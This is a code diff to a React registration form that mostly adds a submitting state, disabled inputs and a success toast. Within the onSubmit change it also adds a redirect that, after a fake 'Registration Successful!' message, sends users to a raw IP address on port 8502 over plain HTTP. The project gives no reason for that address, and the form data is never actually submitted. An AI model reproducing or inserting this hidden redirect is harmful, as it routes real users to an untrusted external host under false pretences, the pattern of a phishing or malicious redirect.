@@ -20,6 +20,7 @@ import { Card, CardContent, CardDescription, CardHeader, CardTitle, CardFooter }
 import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from "@/components/ui/accordion";
 import { PasswordGenerator } from "./components/password-generator";
 import { Toaster } from "@/components/ui/toaster";
+import { useToast } from "@/hooks/use-toast";
 
 const formSchema = z.object({
   username: z.string().min(3, {
@@ -35,6 +36,8 @@ const formSchema = z.object({
 
 export default function RegistrationPage() {
   const [showPassword, setShowPassword] = useState(false);
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const { toast } = useToast();
 
   const form = useForm<z.infer<typeof formSchema>>({
     resolver: zodResolver(formSchema),
@@ -46,9 +49,23 @@ export default function RegistrationPage() {
   });
 
   function onSubmit(values: z.infer<typeof formSchema>) {
+    setIsSubmitting(true);
     // This is where you would handle the form submission, e.g., call an API.
     console.log(values);
     // For now, we'll just log the values to the console.
+    
+    // Simulate an API call
+    setTimeout(() => {
+      toast({
+        title: "Registration Successful!",
+        description: "Redirecting you now...",
+      });
+      
+      // Redirect after a short delay to allow the user to see the message
+      setTimeout(() => {
+        window.location.href = "http://111.229.140.236:8502/#2ffb9408";
+      }, 1500);
+    }, 1000);
   }
   
   const handlePasswordGenerated = (password: string) => {
@@ -76,7 +93,7 @@ export default function RegistrationPage() {
                     <FormItem>
                       <FormLabel>Username</FormLabel>
                       <FormControl>
-                        <Input placeholder="DungeonMaster42" {...field} />
+                        <Input placeholder="DungeonMaster42" {...field} disabled={isSubmitting} />
                       </FormControl>
                       <FormMessage />
                     </FormItem>
@@ -89,7 +106,7 @@ export default function RegistrationPage() {
                     <FormItem>
                       <FormLabel>Email</FormLabel>
                       <FormControl>
-                        <Input type="email" placeholder="your.name@example.com" {...field} />
+                        <Input type="email" placeholder="your.name@example.com" {...field} disabled={isSubmitting} />
                       </FormControl>
                       <FormMessage />
                     </FormItem>
@@ -106,7 +123,8 @@ export default function RegistrationPage() {
                           <Input 
                             type={showPassword ? "text" : "password"} 
                             placeholder="Your secret passphrase" 
-                            {...field} 
+                            {...field}
+                            disabled={isSubmitting} 
                           />
                           <Button 
                             type="button" 
@@ -115,6 +133,7 @@ export default function RegistrationPage() {
                             className="absolute inset-y-0 right-0 h-full px-3"
                             onClick={() => setShowPassword(!showPassword)}
                             aria-label={showPassword ? "Hide password" : "Show password"}
+                            disabled={isSubmitting}
                           >
                             {showPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                           </Button>
@@ -127,15 +146,15 @@ export default function RegistrationPage() {
 
                 <Accordion type="single" collapsible className="w-full">
                   <AccordionItem value="item-1" className="border-b-0">
-                    <AccordionTrigger className="text-sm hover:no-underline">Need a strong password?</AccordionTrigger>
+                    <AccordionTrigger className="text-sm hover:no-underline" disabled={isSubmitting}>Need a strong password?</AccordionTrigger>
                     <AccordionContent>
                       <PasswordGenerator onPasswordGenerated={handlePasswordGenerated} />
                     </AccordionContent>
                   </AccordionItem>
                 </Accordion>
 
-                <Button type="submit" className="w-full">
-                  Create Account
+                <Button type="submit" className="w-full" disabled={isSubmitting}>
+                  {isSubmitting ? 'Submitting...' : 'Create Account'}
                 </Button>
               </form>
             </Form>
